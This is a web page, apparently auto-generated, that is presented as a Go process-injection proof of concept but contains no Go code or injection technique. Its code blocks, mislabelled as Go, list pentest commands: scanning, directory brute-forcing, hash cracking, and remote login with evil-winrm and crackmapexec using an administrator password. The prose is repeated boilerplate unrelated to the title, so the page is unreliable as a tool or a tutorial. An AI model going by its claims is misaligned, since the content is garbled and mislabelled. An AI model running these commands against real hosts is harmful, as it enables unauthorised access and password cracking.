---
TitleSEO: "Process Injection PoC in Go | ZureFX"
TitlePost: "Process Injection PoC — Go"
Author: "ZureFX"
Description: "A Go script for process injection poc. Built for security research and automation."
Keywords: "bash, tool, automation, fuzzer, go"
URL: "https://zurefx.github.io/scripting/script-process-injection-poc-505.html"
URL_IMAGES: ""
Date: "2025-04-25"
Tags: "Bash, Tool, Automation, Fuzzer, Go"
Section: "scripting"
Lang: "en"
main_img: "script-process-injection-poc-505"
Permalink: "/scripting/script-process-injection-poc-505.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The backup files contained sensitive information that should not have been accessible. Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `rubeus`
- `evil-winrm`
- `bloodhound`

## Implementation

### Core Logic

The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials.

```go
nmap -sCV -p443,3268,110 10.35.219.127 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
crackmapexec smb 10.44.78.219 -u administrator -p 'P@ssw0rd!' --shares
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The backup files contained sensitive information that should not have been accessible.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. The backup files contained sensitive information that should not have been accessible.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.84.44.163/FUZZ
feroxbuster -h
evil-winrm -i 10.30.140.67 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.53.146.173/FUZZ
```

## Usage

### Basic Usage

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
evil-winrm -i 10.34.3.181 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.50.121.208/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.56.83.165/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
evil-winrm -i 10.106.19.93 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.76.21.202 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality.

```
[+] Scanning target...
[+] Found 16 results
[+] Done in 27.73s
```
